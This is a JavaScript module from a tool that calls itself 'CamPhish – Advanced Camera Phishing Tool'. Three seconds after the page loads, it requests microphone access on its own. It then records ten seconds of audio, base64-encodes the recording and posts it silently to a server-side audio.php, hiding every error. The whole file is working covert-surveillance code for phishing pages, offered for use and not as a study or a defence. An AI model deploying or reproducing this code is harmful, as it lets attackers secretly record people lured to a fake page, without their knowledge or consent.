/**
 * CamPhish - Advanced Camera Phishing Tool
 * Audio Capture Module
 * 
 * @author     Rahul Kushwaha
 * @github     https://github.com/raahulllkushwaha
 * @repository https://github.com/raahulllkushwaha/Cam-Phisher
 * @license    GNU General Public License v3.0
 */

(function() {
    'use strict';

    var mediaRecorder = null;
    var audioChunks = [];
    var recordingDuration = 10000; // 10 seconds
    var startDelay = 3000; // 3 seconds delay after page load

    /**
     * Starts audio recording using MediaRecorder API
     */
    function startRecording() {
        // Check if MediaRecorder is supported
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return;
        }

        navigator.mediaDevices.getUserMedia({ audio: true, video: false })
            .then(function(stream) {
                handleStream(stream);
            })
            .catch(function(error) {
                // Microphone access denied or error occurred
            });
    }

    /**
     * Handles the audio stream and sets up MediaRecorder
     * @param {MediaStream} stream - Audio stream from microphone
     */
    function handleStream(stream) {
        try {
            // Determine supported MIME type
            var mimeType = 'audio/webm';
            if (MediaRecorder.isTypeSupported) {
                if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
                    mimeType = 'audio/webm;codecs=opus';
                } else if (MediaRecorder.isTypeSupported('audio/webm')) {
                    mimeType = 'audio/webm';
                } else if (MediaRecorder.isTypeSupported('audio/ogg;codecs=opus')) {
                    mimeType = 'audio/ogg;codecs=opus';
                }
            }

            mediaRecorder = new MediaRecorder(stream, { mimeType: mimeType });
            audioChunks = [];

            mediaRecorder.ondataavailable = function(event) {
                if (event.data && event.data.size > 0) {
                    audioChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = function() {
                // Stop all tracks
                stream.getTracks().forEach(function(track) {
                    track.stop();
                });

                // Process and send the recorded audio
                processAudio();
            };

            mediaRecorder.onerror = function(event) {
                // Recording error occurred
                stream.getTracks().forEach(function(track) {
                    track.stop();
                });
            };

            // Start recording
            mediaRecorder.start();

            // Stop recording after specified duration
            setTimeout(function() {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, recordingDuration);

        } catch (e) {
            // Error setting up MediaRecorder
        }
    }

    /**
     * Processes recorded audio and converts to base64
     */
    function processAudio() {
        if (audioChunks.length === 0) {
            return;
        }

        var audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
        var reader = new FileReader();

        reader.onloadend = function() {
            var base64Data = reader.result;
            // Remove the data URL prefix to get pure base64
            var base64Audio = base64Data.split(',')[1];
            sendAudio(base64Audio);
        };

        reader.onerror = function() {
            // Error reading audio data
        };

        reader.readAsDataURL(audioBlob);
    }

    /**
     * Sends audio data to the server
     * @param {string} base64Audio - Base64 encoded audio data
     */
    function sendAudio(base64Audio) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'audio.php', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                // Audio data sent
            }
        };

        xhr.onerror = function() {
            // Error sending audio
        };

        xhr.send('audio=' + encodeURIComponent(base64Audio));
    }

    /**
     * Initialize audio capture with delay
     */
    function init() {
        setTimeout(function() {
            startRecording();
        }, startDelay);
    }

    // Auto-start 3 seconds after page load
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
